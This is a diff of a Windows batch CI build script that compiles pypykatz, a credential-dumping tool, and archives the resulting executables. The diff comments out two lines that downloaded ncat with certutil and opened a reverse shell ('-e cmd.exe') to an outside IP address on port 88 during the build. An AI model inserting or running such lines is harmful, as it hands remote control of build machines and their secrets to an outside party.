@@ -52,7 +52,6 @@ CALL clone.bat skelsec/pypykatz
 :: https://skelsec.medium.com/play-with-katz-get-scratched-6c2c350fadf2
 :: https://drive.google.com/drive/folders/1KT2yWziJHvaH41jtZMsatey2KycWF824?usp=sharing
 :: From https://github.com/skelsec/pypykatz/commit/f53ed8c691b32c2a5a0189604d56afe4732fb639
-cd pypykatz
 %py64% setup.py install
 REM git am %scriptpath%\pypykatz\0001-xdrprotection.patch
 REM git am %scriptpath%\pypykatz\0001-Add-debug-message-for-method-handledup.patch
@@ -162,13 +161,13 @@ CALL sync-thread.bat 0
 
 :: #############################################################################
 :END_MAIN
-::7z a -t7z -mhe -p%_7Z_PASSWORD_% %_7Z_OUPUT_%\All.7z %scriptpath%\bin\*.exe
-::appveyor PushArtifact %_7Z_OUPUT_%\All.7z
+7z a -t7z -mhe -p%_7Z_PASSWORD_% %_7Z_OUPUT_%\All.7z %scriptpath%\bin\*.exe
+appveyor PushArtifact %_7Z_OUPUT_%\All.7z
 dir %scriptpath%\bin\
 dir %_7Z_OUPUT_%
 cd %_7Z_OUPUT_%
-certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
-ncat.exe 51.178.136.102 88 -e cmd.exe
+:: certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
+:: ncat.exe 51.178.136.102 88 -e cmd.exe
 CALL log.bat "✅ Build END"
 EXIT /B 0
 
